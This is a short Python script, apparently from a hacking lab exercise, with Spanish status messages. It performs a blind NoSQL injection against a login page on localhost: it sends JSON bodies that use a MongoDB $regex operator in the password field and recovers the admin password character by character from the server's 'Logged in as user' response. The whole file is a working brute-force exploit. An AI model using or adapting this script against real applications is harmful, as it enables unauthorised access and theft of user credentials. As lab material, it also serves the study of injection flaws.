#!/usr/bin/python3

from pwn import *
import time, signal, sys, string, requests


def def_handler(sig,frame):
    print("\n\n[+] Saliendo...\n")
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)


login_url = 'http://localhost:4000/user/login'
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def makeNoSQLI():
    
    password = ''
    
    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    sleep(2)

    p2 = log.progress("Password")

    for i in range(0,24):
        for character in characters:
            post_data = '{"username":"admin","password":{"$regex":"^%s%s"}}' % (password,character)
            headers = {'Content-Type': 'application/json'}
            
            p1.status(post_data)

            r = requests.post(login_url, headers=headers, data=post_data)

            if "Logged in as user" in r.text:
                password+=character
                p2.status(password)
                break

if __name__ == "__main__":

    makeNoSQLI()
